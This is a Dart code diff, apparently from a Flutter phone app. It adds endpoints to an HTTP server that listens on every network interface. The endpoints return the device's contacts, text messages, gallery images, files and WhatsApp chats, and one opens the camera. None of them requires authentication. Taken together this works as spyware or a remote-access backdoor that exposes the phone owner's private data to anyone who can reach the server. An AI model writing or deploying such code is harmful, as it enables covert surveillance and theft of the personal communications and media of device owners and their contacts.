@@ -51,6 +51,98 @@ Future<void> startServer() async {
     }
   });
 
+  router.post('/get_contacts', (Request request) async {
+    try {
+      // Fetch contacts using the native method
+      final contacts = await platform.invokeMethod("getContacts");
+
+      return Response.ok(contacts.toString());
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
+  router.post('/get_messages', (Request request) async {
+    try {
+      // Parse the body as JSON
+      final body = await request.readAsString();
+      final jsonBody = jsonDecode(body);
+
+      // Extract the phone number from the JSON
+      final phoneNumber = jsonBody['phoneNumber']; // Ensure the key is correct
+
+      if (phoneNumber != null) {
+        // Call the native method with the phone number
+        final callLogs = await platform.invokeMethod("getMessages", {
+          "phoneNumber": phoneNumber,
+        });
+
+        return Response.ok(callLogs.toString());
+      } else {
+        return Response.badRequest(body: 'Phone number is missing');
+      }
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
+  router.post('/get_gallery', (Request request) async {
+    try {
+      // Fetch gallery images using the native method
+      final gallery = await platform.invokeMethod("getGalleryImages");
+
+      return Response.ok(gallery.toString());
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
+  router.post('/get_files', (Request request) async {
+    try {
+      // Fetch files using the native method
+      final files = await platform.invokeMethod("getFiles");
+
+      return Response.ok(files.toString());
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
+  router.post('/access_camera', (Request request) async {
+    try {
+      // Request camera access through the native method
+      final cameraAccess = await platform.invokeMethod("openCamera");
+
+      return Response.ok(cameraAccess.toString());
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
+  router.post('/get_whatsapp_chats', (Request request) async {
+    try {
+      // Parse the body as JSON
+      final body = await request.readAsString();
+      final jsonBody = jsonDecode(body);
+
+      // Extract the phone number from the JSON
+      final phoneNumber = jsonBody['phoneNumber']; // Ensure the key is correct
+      final message = jsonBody['message'];
+
+      if (phoneNumber != null && message != null) {
+        // Call the native method with the phone number
+        final callLogs = await platform.invokeMethod("getWhatsappChats",
+            {"phoneNumber": phoneNumber, "message": message});
+
+        return Response.ok(callLogs.toString());
+      } else {
+        return Response.badRequest(body: 'Phone number or message is missing');
+      }
+    } catch (e) {
+      return Response.internalServerError(body: e.toString());
+    }
+  });
+
   final server = await shelf_io.serve(
     const Pipeline().addMiddleware(logRequests()).addHandler(router),
     InternetAddress.anyIPv4,
